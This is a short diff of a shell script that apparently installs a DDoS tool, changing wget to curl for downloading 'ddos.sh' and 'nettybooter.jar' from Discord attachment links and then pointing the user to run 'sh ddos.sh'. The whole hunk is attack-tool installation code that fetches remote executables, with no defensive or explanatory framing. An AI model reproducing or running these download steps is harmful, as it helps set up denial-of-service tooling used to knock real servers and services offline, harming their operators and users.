@@ -182,9 +182,9 @@ echo "--------------"
 if ! [ -f ddos.sh ];
 then
 echo "Installing deps"
-wget https://cdn.discordapp.com/attachments/920543974266130523/929337717588885514/ddos.sh
+curl -o ddos.sh https://cdn.discordapp.com/attachments/920543974266130523/929337717588885514/ddos.sh
 echo "1/2"
-wget https://cdn.discordapp.com/attachments/920543974266130523/929309799110307900/nettybooter.jar
+curl -o nettybooter.jar https://cdn.discordapp.com/attachments/920543974266130523/929309799110307900/nettybooter.jar
 echo "2/2"
 echo "Deps installed"
 echo "For help enter: sh ddos.sh"
